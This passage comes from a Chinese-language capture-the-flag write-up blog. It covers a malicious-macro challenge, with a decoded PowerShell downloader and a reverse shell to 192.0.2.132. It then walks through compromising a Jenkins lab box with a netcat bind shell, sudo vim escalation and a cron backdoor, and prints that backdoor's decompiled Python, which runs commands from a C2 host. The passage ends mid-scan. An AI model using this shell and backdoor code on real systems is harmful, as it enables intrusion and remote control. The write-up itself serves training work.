dAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsA&quot;$c &#x3D; [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($payload))if ($payload -match &quot;http:|https:&quot;) &#123;    $payload &#x3D; (New-Object &quot;Net.Webclient&quot;).DownloadString($payload);&#125;iex $c;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload再解密</p><pre class="line-numbers language-none"><code class="language-none">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;192.0.2.132&quot;,443);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2  &#x3D; $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>get flag1</code></p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; a &#x3D; &quot;&quot;&quot;) &#39;x&#39;+]31[DIlLeHs$+]1[DiLLehs$ (&amp;| )431[DIlLeHs$+]1[DiLLehs$ (&amp;| )43]RAhc[]GnIRTs[,&#39;tXj&#39;(ecALPER.)&#39;$&#39;,&#39;wqi&#39;(eCALPER.)&#39;;tX&#39;+&#39;jsc0d_d3lb4n3_0rc4m&#39;+&#39;&#123;g&#39;+&#39;a&#39;+&#39;lftXj &#39;+&#39;&#x3D;1_ga&#39;+&#39;lfwqi&#39;(&quot;,&#39;.&#39;, &#39;R&#39;+&#39;iGHTtOl&#39;+&#39;eft&#39; )&quot;&quot;&quot;&gt;&gt;&gt; print(a[::-1])) &#39;tfe&#39;+&#39;lOtTHGi&#39;+&#39;R&#39; ,&#39;.&#39;,&quot;(&#39;iqwfl&#39;+&#39;ag_1&#x3D;&#39;+&#39; jXtfl&#39;+&#39;a&#39;+&#39;g&#123;&#39;+&#39;m4cr0_3n4bl3d_d0csj&#39;+&#39;Xt;&#39;).REPLACe(&#39;iqw&#39;,&#39;$&#39;).REPLAce(&#39;jXt&#39;,[sTRInG][chAR]34) |&amp;( $sheLLiD[1]+$sHeLlID[134) |&amp;( $sheLLiD[1]+$sHeLlID[13]+&#39;x&#39; )&gt;&gt;&gt;flag&#123;m4cr0_3n4bl3d_d0cs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>get flag2</code></p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; a &#x3D; &quot;&quot;&quot; ) )63]Rahc[,&#39;raZ&#39;EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )&#39;;2&#39;+&#39;N&#39;+&#39;1&#39;+&#39;&#125;su0r3g&#39;+&#39;n4d_3r4&#39;+&#39;_2N1 &#x3D; 2_ga&#39;+&#39;lfr&#39;+&#39;aZ&#39;(( ( )&#39;&#39;niOj-&#39;x&#39;+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . &quot;  ) &quot;&quot;&quot;&gt;&gt;&gt; print(a[::-1]) )  &quot; . ( $vERBOsEpReFereNcE.toSTriNG()[1,3]+&#39;x&#39;-jOin&#39;&#39;) ( ((&#39;Za&#39;+&#39;rfl&#39;+&#39;ag_2 &#x3D; 1N2_&#39;+&#39;4r3_d4n&#39;+&#39;g3r0us&#125;&#39;+&#39;1&#39;+&#39;N&#39;+&#39;2;&#39;)  -cREplACe  ([chaR]49+[chaR]78+[chaR]50),[chaR]34 -RePlacE&#39;Zar&#39;,[chaR]36) )&gt;&gt;&gt;4r3_d4ng3r0us&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>flag</code></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;m4cr0_3n4bl3d_d0cs_4r3_d4ng3r0us&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Locked-outside"><a href="#Locked-outside" class="headerlink" title="Locked outside"></a>Locked outside</h3><pre class="line-numbers language-none"><code class="language-none">Based on the payload discovered, the employee’s computer was used to compromise a machine in our network.We checked the machine and confirmed that we’ve lost SSH access to it.Can you check if we can get the access back?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出的是个<code>ova</code>后缀名的镜像文件，先将这个靶机导入VMware。靶机镜像我存入百度网盘里面了，下面是链接：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1qBF5ER6kBmBuqTLGbpAr0g 提取码：e1ic <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意到改靶机开启的时候有下面的内容</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906215449810.png" alt></p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">nmap -T4 -A -v 192.168.10.143<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-result" data-language="result"><code class="language-result">PORT     STATE SERVICE VERSION21&#x2F;tcp   open  ftp     vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r--    1 0        21            129 Jun 22 09:50 note.txt| ftp-syst: |   STAT: | FTP server status:|      Connected to 192.168.10.1|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 2|      vsFTPd 3.0.3 - secure, fast, stable|_End of status22&#x2F;tcp   open  ssh     OpenSSH 8.4 (protocol 2.0)| ssh-hostkey: |   3072 38:08:fc:0d:8a:8a:f8:ea:fb:4d:6c:af:1d:22:e1:ff (RSA)|   256 2d:d7:bf:a1:62:58:18:d9:80:e7:7c:15:c6:d6:32:64 (ECDSA)|_  256 34:7a:7e:dd:ba:a7:be:d7:3c:0e:9b:5a:73:cb:86:cb (ED25519)8080&#x2F;tcp open  http    Jetty 9.4.39.v20210325|_http-title: Site doesn&#39;t have a title (text&#x2F;html;charset&#x3D;utf-8).| http-robots.txt: 1 disallowed entry |_&#x2F;|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1|_http-server-header: Jetty(9.4.39.v20210325)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>21号端口ftp服务开着，注意到下面的文件:</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906215922064.png" alt></p><pre class="line-numbers language-none"><code class="language-none"># Jenkins Development Server# This is a development server# default credentials - ssh# username: root# password: alpine_r00t<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个用户名密码用在Jenkins后台密码不行，登不上，用<code>admin:admin</code>才登上。</p><p>登上去有个项目，然后config，然后</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906224151038.png" alt></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">Jenkins:  nc -nlvp 4444 -e &#x2F;bin&#x2F;ashAttacker: nc 192.168.10.143 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后Build Now就行了，查看之后shell已经建成了</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906232405853.png" alt></p><p>然后nc一下就拿到shell了</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906232448923.png" alt></p><p>然后查看<code>/etc/ssh</code></p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">ls &#x2F;etc&#x2F;sshmodulissh_configssh_host_dsa_keyssh_host_dsa_key.pubssh_host_ecdsa_keyssh_host_ecdsa_key.pubssh_host_ed25519_keyssh_host_ed25519_key.pubssh_host_rsa_keyssh_host_rsa_key.pubsshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag就在最后的<code>sshd_config</code>这个文件里面了</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep flag# flag&#123;r00t_l0gin_1s_1ns3cur3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Changing-our-locks-and-dumping-old-keys"><a href="#Changing-our-locks-and-dumping-old-keys" class="headerlink" title="Changing our locks and dumping old keys"></a>Changing our locks and dumping old keys</h3><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo &#x2F;usr&#x2F;bin&#x2F;vim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Jinkens权限下可以使用上面的命令，vim编辑器下可以执行命令，就带来了一个间接的权限提升。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210908093425089.png" alt></p><p>然后他说是一个持续的后门任务，那就首先想到<code>crontab</code></p><pre class="line-numbers language-none"><code class="language-none">crontab -u root -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210908093604318.png" alt="image-20210908093604318"></p><p>然后将这个文件cp到ftp的文件目录下方便我们查看下载</p><pre class="line-numbers language-none"><code class="language-none">$ find &#x2F; -name ftp&#x2F;var&#x2F;lib&#x2F;ftp$ cp &#x2F;bin&#x2F;stayalive &#x2F;var&#x2F;lib&#x2F;ftp$ ls &#x2F;var&#x2F;lib&#x2F;ftpnote.txtstayalive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一个pyc文件，我是用离线的反编译工具反编译了一下</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210908100437220.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># uncompyle6 version 3.7.4</span><span class="token comment"># Python bytecode 3.8 (3413)</span><span class="token comment"># Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]</span><span class="token comment"># Embedded file name: ./stayalive.py</span><span class="token comment"># Compiled at: 2021-06-24 23:00:26</span><span class="token comment"># Size of source mod 2**32: 2810 bytes</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span> subprocess<span class="token punctuation">,</span> os<span class="token punctuation">,</span> ssl<span class="token keyword">def</span> <span class="token function">sczsz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> c2domain    <span class="token keyword">global</span> c2port    <span class="token keyword">global</span> s    <span class="token keyword">global</span> ssls    <span class="token keyword">global</span> tt    <span class="token keyword">try</span><span class="token punctuation">:</span>        tt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">266</span><span class="token punctuation">,</span> <span class="token number">273</span><span class="token punctuation">,</span> <span class="token number">292</span><span class="token punctuation">,</span> <span class="token number">310</span><span class="token punctuation">,</span> <span class="token number">319</span><span class="token punctuation">,</span> <span class="token number">337</span><span class="token punctuation">,</span> <span class="token number">354</span><span class="token punctuation">,</span> <span class="token number">357</span><span class="token punctuation">,</span> <span class="token number">366</span><span class="token punctuation">,</span> <span class="token number">377</span><span class="token punctuation">,</span> <span class="token number">385</span><span class="token punctuation">,</span> <span class="token number">414</span><span class="token punctuation">,</span> <span class="token number">418</span><span class="token punctuation">,</span> <span class="token number">421</span><span class="token punctuation">]</span>        c2domain <span class="token operator">=</span> <span class="token string">'c2.m1cr0s0ft.hax'</span>        c2port <span class="token operator">=</span> <span class="token number">64318</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>        ssls <span class="token operator">=</span> ssl<span class="token punctuation">.</span>wrap_socket<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ssl_version<span class="token operator">=</span><span class="token punctuation">(</span>ssl<span class="token punctuation">.</span>PROTOCOL_TLSv1_2<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> OO00OOOO0O00O00OO<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'socket creation error: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>OO00OOOO0O00O00OO<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">finally</span><span class="token punctuation">:</span>                OO00OOOO0O00O00OO <span class="token operator">=</span> <span class="token boolean">None</span>                <span class="token keyword">del</span> OO00OOOO0O00O00OO        <span class="token keyword">finally</span><span class="token punctuation">:</span>            OO00OOOO0O00O00OO <span class="token operator">=</span> <span class="token boolean">None</span>            <span class="token keyword">del</span> OO00OOOO0O00O00OO<span class="token keyword">def</span> <span class="token function">cscsz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        ssls<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>c2domain<span class="token punctuation">,</span> c2port<span class="token punctuation">)</span><span class="token punctuation">)</span>        xbx <span class="token operator">=</span> <span class="token string">'--- BEGIN PRIVATE KEY ---\t\tfCfnaEldanaKJdiga&#123;enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\t\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\t\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\t\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\t\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\t\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw&#125;6nCaf\t\t--- END PRIVATE KEY ---'</span>        ssls<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>xbx<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> tt<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'>'</span> <span class="token operator">+</span> <span class="token string">' > '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> O0OO000O0OO0000OO<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'socket conn error: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>O0OO000O0OO0000OO<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">finally</span><span class="token punctuation">:</span>                O0OO000O0OO0000OO <span class="token operator">=</span> <span class="token boolean">None</span>                <span class="token keyword">del</span> O0OO000O0OO0000OO        <span class="token keyword">finally</span><span class="token punctuation">:</span>            O0OO000O0OO0000OO <span class="token operator">=</span> <span class="token boolean">None</span>            <span class="token keyword">del</span> O0OO000O0OO0000OO<span class="token keyword">def</span> <span class="token function">zszszs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        O00OO000O00OOO0O0 <span class="token operator">=</span> ssls<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        O00OO000O00OOO0O0 <span class="token operator">=</span> O00OO000O00OOO0O0<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'received '</span> <span class="token operator">+</span> O00OO000O00OOO0O0<span class="token punctuation">)</span>        <span class="token keyword">if</span> O00OO000O00OOO0O0<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'cd'</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>O00OO000O00OOO0O0<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            ssls<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' > '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>O00OO000O00OOO0O0<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                OO0000OO0O0000OO0 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>O00OO000O00OOO0O0<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span><span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span><span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span><span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">)</span>                O000000000O0OOO00 <span class="token operator">=</span> OO0000OO0O0000OO0<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> OO0000OO0O0000OO0<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                O0000O0O0OO0O0OO0 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>O000000000O0OOO00<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ssls<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>O0000O0O0OO0O0OO0 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' > '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>O0000O0O0OO0O0OO0<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>                    OO0O00OOO00OO0OO0 <span class="token operator">=</span> <span class="token number">2</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    OO0O00OOO00OO0OO0 <span class="token operator">=</span> <span class="token number">0</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Sent: '</span> <span class="token operator">+</span> OO0O00OOO00OO0OO0 <span class="token operator">*</span> <span class="token string">'\n'</span> <span class="token operator">+</span> O0000O0O0OO0O0OO0<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> O00OO000O00OOO0O0<span class="token punctuation">:</span>            <span class="token keyword">break</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sczsz<span class="token punctuation">(</span><span class="token punctuation">)</span>    cscsz<span class="token punctuation">(</span><span class="token punctuation">)</span>    zszszs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解一下flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">xbx <span class="token operator">=</span> <span class="token string">'--- BEGIN PRIVATE KEY ---\t\tfCfnaEldanaKJdiga&#123;enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\t\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\t\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\t\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\t\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\t\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw&#125;6nCaf\t\t--- END PRIVATE KEY ---'</span>tt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">266</span><span class="token punctuation">,</span> <span class="token number">273</span><span class="token punctuation">,</span> <span class="token number">292</span><span class="token punctuation">,</span> <span class="token number">310</span><span class="token punctuation">,</span> <span class="token number">319</span><span class="token punctuation">,</span> <span class="token number">337</span><span class="token punctuation">,</span> <span class="token number">354</span><span class="token punctuation">,</span> <span class="token number">357</span><span class="token punctuation">,</span> <span class="token number">366</span><span class="token punctuation">,</span> <span class="token number">377</span><span class="token punctuation">,</span> <span class="token number">385</span><span class="token punctuation">,</span> <span class="token number">414</span><span class="token punctuation">,</span> <span class="token number">418</span><span class="token punctuation">,</span> <span class="token number">421</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>xbx<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> tt<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;b4ckd00rs_4r3_us3ful_f0r_p3rs1st3nc3&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Know-your-enemy"><a href="#Know-your-enemy" class="headerlink" title="Know your enemy"></a>Know your enemy</h3><p>这题的在线环境没有了，但是我看着wp还是挺简单的，这里就不再复现了。</p><h3 id="Blue-team-becomes-Red-Team"><a href="#Blue-team-becomes-Red-Team" class="headerlink" title="Blue team becomes Red Team"></a>Blue team becomes Red Team</h3><p>下面开始是另一个系列，这道题目的附件我也放在了百度网盘里面了，自取。</p><pre class="line-numbers language-none"><code class="language-none">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1xRyrZlthS4tmuJbctKnf6Q 提取码：fsrb <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先配置网络</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210908152806811.png" alt></p><p>用nmap扫描一下看看</p><pre class="line-numbers language-none"><code class="language-none">PORT   STATE SERVICE VERSION22&#x2F;tcp open  ssh     OpenSSH 8.4 (protocol 2.0)| ssh-hostkey: |   3072 38:08:fc:0d:8a:8a:f8:ea:fb:4d:6c:af:1d:22:e1:ff (RSA)|   256 2d:d7:bf:a1:62:58:18:d9:80:e7:7c:15:c6:d6:32:64 (ECDSA)|_  256 34:7a:7e:dd:ba:a7:be:d7:3c:0e:9b:5a:73:cb:86:cb (ED25519)80&#x2F;tcp open  http    Node.js Express framework|_http-title: Hyperion Group - Coming Soon|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA6379&#x2F;tcp open  redis   Redis key-value store 6.0.14<span aria-hidden="true" 